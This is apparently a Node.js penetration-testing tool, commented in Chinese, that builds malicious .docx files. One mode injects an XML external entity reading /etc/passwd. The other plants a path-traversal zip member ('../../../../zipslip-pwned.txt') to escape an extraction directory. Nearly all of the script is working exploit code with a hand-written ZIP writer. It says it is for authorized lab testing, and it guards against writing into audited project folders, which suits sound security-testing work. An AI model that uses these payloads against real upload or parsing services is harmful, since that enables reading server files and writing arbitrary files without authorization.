#!/usr/bin/env node
// 恶意文档构造器 —— 办公类专用（zip+xml 攻击面）
// 用法: node docx-evil.mjs [--mode xxe|zipslip] [--out evil.docx]
// 原理: .docx = zip + xml。XXE 打 XML 解析链, zipslip 打解压链(实证 CVE-2020-11535/11536)
// 零依赖: 使用 Node 内置 zlib.crc32 实现最小 ZIP 写入器(store 不压缩)
import { writeFileSync, readdirSync } from "node:fs";
import { dirname, resolve } from "node:path";
import zlib from "node:zlib";

function argOf(name, fallback) {
  const eq = process.argv.find((a) => a.startsWith(`--${name}=`));
  if (eq) return eq.slice(name.length + 3);
  const i = process.argv.indexOf(`--${name}`);
  if (i >= 0 && process.argv[i + 1] && !process.argv[i + 1].startsWith("--")) return process.argv[i + 1];
  return fallback;
}
const mode = argOf("mode", "xxe");
const out = argOf("out", "evil.docx");

// ---------- 最小 ZIP 写入器（store 方法） ----------
function crc32(buf) { return zlib.crc32(buf) >>> 0; }
function zip(files) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  const DOSTIME = 0, DOSDATE = 0x21; // 占位时间
  for (const { name, content } of files) {
    const nameBuf = Buffer.from(name, "utf8");
    const data = Buffer.from(content, "utf8");
    const crc = crc32(data);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);        // version needed
    lh.writeUInt16LE(0, 6);         // flags
    lh.writeUInt16LE(0, 8);         // method: store
    lh.writeUInt16LE(DOSTIME, 10);
    lh.writeUInt16LE(DOSDATE, 12);
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(data.length, 18);
    lh.writeUInt32LE(data.length, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    lh.writeUInt16LE(0, 28);
    locals.push(lh, nameBuf, data);

    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(20, 4);        // version made by
    ch.writeUInt16LE(20, 6);        // version needed
    ch.writeUInt16LE(0, 8);
    ch.writeUInt16LE(0, 10);        // method
    ch.writeUInt16LE(DOSTIME, 12);
    ch.writeUInt16LE(DOSDATE, 14);
    ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(data.length, 20);
    ch.writeUInt32LE(data.length, 24);
    ch.writeUInt16LE(nameBuf.length, 28);
    ch.writeUInt16LE(0, 30);        // extra len
    ch.writeUInt16LE(0, 32);        // comment len
    ch.writeUInt16LE(0, 34);        // disk number
    ch.writeUInt16LE(0, 36);        // internal attrs
    ch.writeUInt32LE(0, 38);        // external attrs
    ch.writeUInt32LE(offset, 42);   // local header offset
    centrals.push(ch, nameBuf);

    offset += 30 + nameBuf.length + data.length;
  }
  const centralBuf = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8);
  eocd.writeUInt16LE(files.length, 10);
  eocd.writeUInt32LE(centralBuf.length, 12);
  eocd.writeUInt32LE(offset, 16);
  eocd.writeUInt16LE(0, 20);
  return Buffer.concat([...locals, centralBuf, eocd]);
}

// ---------- 最小 docx 结构 ----------
const CONTENT_TYPES = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`;
const RELS = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`;

let files;
if (mode === "xxe") {
  const DOC = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>`;
  files = [
    { name: "[Content_Types].xml", content: CONTENT_TYPES },
    { name: "_rels/.rels", content: RELS },
    { name: "word/document.xml", content: DOC },
  ];
} else if (mode === "zipslip") {
  const DOC = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>zipslip-poc</w:t></w:r></w:p></w:body></w:document>`;
  files = [
    { name: "[Content_Types].xml", content: CONTENT_TYPES },
    { name: "_rels/.rels", content: RELS },
    { name: "word/document.xml", content: DOC },
    // zip-slip 载荷: 成员名含 ../ —— 解压不校验路径时可逃逸写入
    { name: "../../../../zipslip-pwned.txt", content: "zip-slip PoC: 解压路径未校验，文件已逃逸到压缩包目录之外" },
  ];
} else {
  console.error(`未知模式 ${mode}（可选 xxe | zipslip）`);
  process.exit(1);
}

// 零改动原则守卫: 载荷文件禁止写进疑似审计目标的目录（检测项目根标记文件）
const outDir = dirname(resolve(out));
try {
  const markers = readdirSync(outDir).filter(
    (f) => /^(pyproject\.toml|package\.json|pom\.xml|composer\.json|setup\.py|go\.mod)$/.test(f) || f === "src"
  );
  if (markers.length && !process.argv.includes("--force")) {
    console.error(`[!] 零改动原则: 输出目录疑似审计目标（发现 ${markers[0]}）。请把 --out 指到目标目录之外，或加 --force 确认。`);
    process.exit(1);
  }
} catch { /* 目录读取失败则跳过守卫 */ }

writeFileSync(out, zip(files));
console.log(`[+] 已生成 ${out}（mode=${mode}, ${files.length} 个成员, store 不压缩）`);
console.log(mode === "xxe"
  ? "    载荷: document.xml 内 DOCTYPE 实体读 file:///etc/passwd —— 上传后观察解析错误/回显"
  : "    载荷: 成员名 ../../../../zipslip-pwned.txt —— 上传并触发解压后检查上级目录是否出现逃逸文件");
console.log("    验证: tar -tf " + out + "   /   tar -xOf " + out + " word/document.xml");
console.log("    注意: 仅用于本地/授权靶场测试");
